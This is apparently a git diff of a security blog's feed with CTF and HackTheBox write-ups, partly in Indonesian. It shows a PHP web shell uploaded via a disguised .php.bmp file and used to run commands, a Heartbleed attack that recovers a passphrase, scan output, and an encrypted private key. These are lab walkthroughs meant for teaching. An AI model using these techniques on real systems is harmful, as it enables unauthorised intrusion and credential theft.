0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]
+&amp;amp;name=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php.bmp&amp;amp;format=BMP
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;dan kita dapat megeksekusi command pada server soal, selanjutnya seperti biasa 
+kita harus menemukan lokasi flag dan ambil isi flag nya.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;view-source:http://pixeditor.challs.malice.fr/images/863fe26761ce67aa88fda11a326f5a5a1c1e5b73f6bf9ef4a773ad010d308e93/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php?c=find%20/%20-type%20f%20-name%20flag
+&amp;gt; /flag
+view-source:http://pixeditor.challs.malice.fr/images/863fe26761ce67aa88fda11a326f5a5a1c1e5b73f6bf9ef4a773ad010d308e93/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.php?c=cat%20/flag
+&amp;gt; Congratz. The flag is : NDH{Msp4int.3x3&amp;gt;all&amp;gt;th3g1mp}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+  
+  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/ctf/writeup-nuitdohack-quals-PixEditor&quot;&gt;Nuitduhack Quals 2018: PixEditor - 350pts&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on April 01, 2018.&lt;/p&gt;</content>
+</entry>
+
+
+
+<entry>
   <title type="html"><![CDATA[Nuitduhack Quals 2018: CoinGame - 200pts]]></title>
   <link rel="alternate" type="text/html" href="http://localhost:4000/ctf/writeup-nuitdohack-quals-CoinGame"/>
   <id>http://localhost:4000/ctf/writeup-nuitdohack-quals-CoinGame</id>
-  <published>2018-03-25T00:00:00+07:00</published>
-  <updated>2018-03-25T00:00:00-00:00</updated>
+  <published>2018-04-01T00:00:00+07:00</published>
+  <updated>2018-04-01T00:00:00-00:00</updated>
   
   <author>
     <name>Abdillah Muhamad</name>
@@ -76,10 +699,12 @@ TFTP_OPTIONS=&quot;--secure --create&quot;
 
 &lt;p&gt;sampai ke tahap dimana kita butuh kemampuan untuk &lt;del&gt;guessing&lt;/del&gt; recon
 untuk mencari akun dari author soal tersebut di internet dan kita bisa temukan di copyright 
-terlihat ada username &lt;code class=&quot;highlighter-rouge&quot;&gt;TOTHEYELLOWMOON&lt;/code&gt; dan juga di github kita mendapatkan repository CoinGame
-&lt;code class=&quot;highlighter-rouge&quot;&gt;https://github.com/totheyellowmoon/CoinGame/&lt;/code&gt;&lt;/p&gt;
+terlihat ada username di copyright &lt;code class=&quot;highlighter-rouge&quot;&gt;TOTHEYELLOWMOON&lt;/code&gt; 
+setelah kita mencari user dengan username tersebut kita menemukan 
+username-nya ada di github dan mempunyai repository &lt;code class=&quot;highlighter-rouge&quot;&gt;CoinGame&lt;/code&gt; itu menandakan
+kita tidak salah orang &lt;code class=&quot;highlighter-rouge&quot;&gt;https://github.com/totheyellowmoon/CoinGame/&lt;/code&gt;&lt;/p&gt;
 
-&lt;p&gt;Deskripsi dari repositorynya : Congrats it was the first step ! Welcome on my Github, this is my new game but I haven’t pushed the modifications …
+&lt;p&gt;dan dugaan kita diperkuat oleh Deskripsi dari repositorynya : Congrats it was the first step ! Welcome on my Github, this is my new game but I haven’t pushed the modifications …
 dari deskripsinya kita bisa menebak bahwa kode yang terbarunya hanya tersimpan di servernya dan belum di push.&lt;/p&gt;
 
 &lt;p&gt;kita clone repositorynya untuk membantu kita mengambil file yang ada diserver dengan memanfaatkan filename nya,
@@ -100,7 +725,11 @@ cd ../
 dir=(&quot;CardFiles&quot; &quot;Cards&quot; &quot;Decks&quot; &quot;gameAnimationImages&quot; &quot;photo&quot; &quot;photo/Drag&quot; &quot;photo/Moderne&quot; &quot;photo/New&quot; &quot;photo/Ogres&quot; &quot;photo/reve&quot;); for d in &quot;${dir[@]}&quot;; do diff &amp;lt;(md5sum $d/* | sed &quot;s/$d//&quot;) &amp;lt;(md5sum ../Server/$d/* | sed &quot;s/\.\.\/Server\/$d//&quot;);done
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;dan didapatkan perbedaan dari file yang ada di repository dan di server&lt;/p&gt;
+&lt;p&gt;Ide dari kode di atas adalah mendownload ulang semua file yang 
+kita ketahui dari Repository CoinGame dan mengambil file yang ada 
+di server dan lakukan perbandingan menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;md5sum&lt;/code&gt; kemudian 
+didapatkan beberapa perbedaan
+dari file yang ada di repository dan di server&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;../images/coingame2.png&quot; alt=&quot;Diff&quot; /&gt;&lt;/p&gt;
 
@@ -109,7 +738,7 @@ dir=(&quot;CardFiles&quot; &quot;Cards&quot; &quot;Decks&quot; &quot;gameAnimati
 &lt;p&gt;&lt;img src=&quot;../images/coingame3.png&quot; alt=&quot;Flag&quot; /&gt;&lt;/p&gt;
 
   
-  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/ctf/writeup-nuitdohack-quals-CoinGame&quot;&gt;Nuitduhack Quals 2018: CoinGame - 200pts&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on March 25, 2018.&lt;/p&gt;</content>
+  &lt;p&gt;&lt;a href=&quot;http://localhost:4000/ctf/writeup-nuitdohack-quals-CoinGame&quot;&gt;Nuitduhack Quals 2018: CoinGame - 200pts&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on April 01, 2018.&lt;/p&gt;</content>
 </entry>
 
 
@@ -316,8 +945,8 @@ Currently, only the user who can login is 'admin'.
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Shh, don't tell anyone. The admin password is f7s0jkl --&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;./login.php&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;get&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-Username:&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-Password:&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+Username:&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name = &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;user&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+Password:&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name = &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pass&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Submit&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
@@ -403,8 +1032,8 @@ Your goal hasn’t changed. Log in.&lt;/p&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Welcome to the admin portal!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
 Currently, only the user who can login is 'admin'.
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-Username:&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;uname&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
-Password:&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id =&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+Username:&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id = &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;uname&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+Password:&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id = &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;button&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onclick=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;checkLogin()&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Log In&lt;span class=&quot;nt&quot;&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;h4&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;color: red;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;
 
@@ -1847,751 +2476,6 @@ you can verified that by running &lt;code class=&quot;highlighter-rouge&quot;&gt
 
   
   &lt;p&gt;&lt;a href=&quot;http://localhost:4000/hackthebox/writeup-hackthebox-enterprise&quot;&gt;Writeup Hackthebox - Enterprise&lt;/a&gt; was originally published by Abdillah Muhamad at &lt;a href=&quot;http://localhost:4000&quot;&gt;@abdilahrf&lt;/a&gt; on March 18, 2018.&lt;/p&gt;</content>
-</entry>
-
-
-
-<entry>
-  <title type="html"><![CDATA[Writeup Hackthebox - Valentine]]></title>
-  <link rel="alternate" type="text/html" href="http://localhost:4000/hackthebox/writeup-hackthebox-valentine"/>
-  <id>http://localhost:4000/hackthebox/writeup-hackthebox-valentine</id>
-  <published>2018-03-09T00:00:00+07:00</published>
-  <updated>2018-03-09T00:00:00-00:00</updated>
-  
-  <author>
-    <name>Abdillah Muhamad</name>
-    <uri>http://localhost:4000</uri>
-    <email>hasny1337@gmail.com</email>
-  </author>
-  
-  
-  <category scheme="http://localhost:4000/tags/#hackthebox" term="hackthebox" />
-  
-  
-  <content type="html">
-  
-    &lt;h2 id=&quot;machine-detail&quot;&gt;Machine Detail&lt;/h2&gt;
-&lt;p&gt;&lt;strong&gt;Name :&lt;/strong&gt; Valentine&lt;br /&gt;
-&lt;strong&gt;IP :&lt;/strong&gt; 10.10.10.79&lt;br /&gt;
-&lt;strong&gt;Author :&lt;/strong&gt; mrb3n&lt;br /&gt;
-&lt;strong&gt;Hostname :&lt;/strong&gt; valentine.htb&lt;br /&gt;
-&lt;strong&gt;OS :&lt;/strong&gt; Linux&lt;br /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;discovery&quot;&gt;Discovery&lt;/h2&gt;
-&lt;p&gt;first, use nmap to find what services available 
-&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sS 10.10.10.79 -v&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Discovered open port 22/tcp on 10.10.10.79
-Discovered open port 443/tcp on 10.10.10.79
-Discovered open port 80/tcp on 10.10.10.79
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;port-80&quot;&gt;Port 80&lt;/h3&gt;
-&lt;p&gt;I try to open the website in port 80 and just got simple web page with 1 images
-then we bruteforce the directory and filename using wordlist from dirbuster to find usefull file.&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---- Scanning URL: http://10.10.10.79/ ----
-+ http://10.10.10.79/cgi-bin/ (CODE:403|SIZE:287)
-+ http://10.10.10.79/decode (CODE:200|SIZE:552)
-==&amp;gt; DIRECTORY: http://10.10.10.79/dev/
-+ http://10.10.10.79/encode (CODE:200|SIZE:554)
-+ http://10.10.10.79/index (CODE:200|SIZE:38)
-+ http://10.10.10.79/index.php (CODE:200|SIZE:38)
-+ http://10.10.10.79/server-status (CODE:403|SIZE:292)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;at this folder http://10.10.10.79/dev/ we found couple of interesting files &lt;code class=&quot;highlighter-rouge&quot;&gt;notes.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;hype_key&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Content of notes.txt
-To do:
-
-1) Coffee.
-2) Research.
-3) Fix decoder/encoder before going live.
-4) Make sure encoding/decoding is only done client-side.
-5) Don't use the decoder/encoder until any of this is done.
-6) Find a better way to take notes.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The idea i got from notes.txt is the encode/decode is not fully fixed, 
-so maybe have couples of vulnerability issue, after that i trying to fuzzing the input in decode and encode
-if i could guess the &lt;code class=&quot;highlighter-rouge&quot;&gt;decode.php&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;encode.php&lt;/code&gt; maybe look like this&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/*decode.php*/
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'text'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-
-/*encode.php*/
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;base64_encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'text'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;so there is no way to get vulnerability there, the function looks safe,
-lets move into another file is &lt;code class=&quot;highlighter-rouge&quot;&gt;hype_key&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN RSA PRIVATE KEY-----
-Proc-Type: 4,ENCRYPTED
-DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46
-
-DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
-5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
-0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
-Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
-OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
-pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
-QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
-p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
-Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
-t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
-XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
-aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
-+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
-AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
-r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
-2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
-e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
-09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
-dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
-cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
-pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
-Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
-suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
-l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
-RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
------END RSA PRIVATE KEY-----
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;this file encrypted with &lt;code class=&quot;highlighter-rouge&quot;&gt;AES-128-CBC&lt;/code&gt; algorithm so we need to find
-the password somehow, i didn’t get anything by trying to bruteforce with
-common wordlist and i looking for another approach.&lt;/p&gt;
-
-&lt;h3 id=&quot;port-22&quot;&gt;Port 22&lt;/h3&gt;
-
-&lt;p&gt;the ssh service using this version &lt;code class=&quot;highlighter-rouge&quot;&gt;SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.10&lt;/code&gt; and
-I did not found exploit for this SSH Version&lt;/p&gt;
-
-&lt;h3 id=&quot;port-443&quot;&gt;Port 443&lt;/h3&gt;
-
-&lt;p&gt;for this port SSL i try to scan using sslscan&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;•% ➜ sslscan 10.10.10.79
-Version: 1.11.11-static
-OpenSSL 1.0.2-chacha (1.0.2g-dev)
-
-Connected to 10.10.10.79
-
-Testing SSL server 10.10.10.79 on port 443 using SNI name 10.10.10.79
-
-  TLS Fallback SCSV:
-Server does not support TLS Fallback SCSV
-
-  TLS renegotiation:
-Secure session renegotiation supported
-
-  TLS Compression:
-Compression disabled
-
-  Heartbleed:
-TLS 1.2 vulnerable to heartbleed
-TLS 1.1 vulnerable to heartbleed
-TLS 1.0 vulnerable to heartbleed
-
-  Supported Server Cipher(s):
-Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
-...snip... 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;so this is vulnerable to heartbleed lets use this &lt;a href=&quot;https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py&quot;&gt;heartbleed.py&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python ~/Tools/other_tools/heartbleed.py 10.10.10.79  -n 100 -a out&lt;/code&gt;
-i start to view the result and trying to decode all base64 there, and until i got this
-base64 &lt;code class=&quot;highlighter-rouge&quot;&gt;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&lt;/code&gt; which is decoded to&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo -n &quot;aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==&quot; |base64 -d
-heartbleedbelievethehype
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;gaining-access&quot;&gt;Gaining Access&lt;/h2&gt;
-
-&lt;p&gt;I try to decrypt the file &lt;code class=&quot;highlighter-rouge&quot;&gt;hype_key&lt;/code&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;heartbleedbelievethehype&lt;/code&gt; as a passphrase&lt;/p&gt;
-
